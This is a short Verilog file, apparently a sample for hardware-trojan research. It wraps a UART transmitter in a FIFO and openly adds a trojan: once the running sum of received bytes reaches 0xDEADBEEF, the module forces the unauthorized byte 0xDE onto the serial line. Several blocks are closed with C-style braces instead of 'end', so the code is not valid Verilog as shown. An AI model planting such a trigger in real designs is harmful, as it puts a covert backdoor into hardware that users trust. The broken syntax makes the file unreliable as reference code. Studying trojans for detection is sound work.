 // Enhanced UART TX Module with FIFO and Hardware Trojan
//
// This module wraps the uart_tx module, adding a FIFO to buffer outgoing data.
// It includes a Hardware Trojan that is triggered under certain conditions to send unauthorized data.
//
module enhanced_uart_tx_fifo_with_trojan (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // Memory and counter for FIFO
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // UART interface
    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Hardware Trojan Activation condition
    reg [31:0] trigger_counter = 32'd0; // Counter to track received data
    wire trojan_activated = (trigger_counter == 32'hDEADBEEF); // Trigger condition

    // Logic to handle reading and writing from FIFO
    wire read = ~uart_busy & (cnt > 5'd0) & ~we;
    wire write = rx_we & (cnt < 5'd31);

    always @ (posedge clk) begin
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
            trigger_counter <= trigger_counter + {24'd0, rx_data}; // Update trigger counter based on incoming data
        }
        else if (read & ~write) begin
            cnt <= cnt - 5'd1;
        }

        // Check if the trojan should activate
        if (trojan_activated) begin
            data <= 8'hDE; // Unauthorized data part 1
            we <= 1'b1; // Force sending of unauthorized data
        end else if (read) begin
            r_addr <= r_addr + 5'd1;
            data <= mem[r_addr];
            we <= 1'b1;
        } else begin
            we <= 1'b0;
        end
        
        if (write) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data;
        end
    end

    // Ensure tx_busy reflects both FIFO activity and UART module activity
    always @ (*) begin
        tx_busy = (cnt != 0) || uart_busy;
    end

endmodule
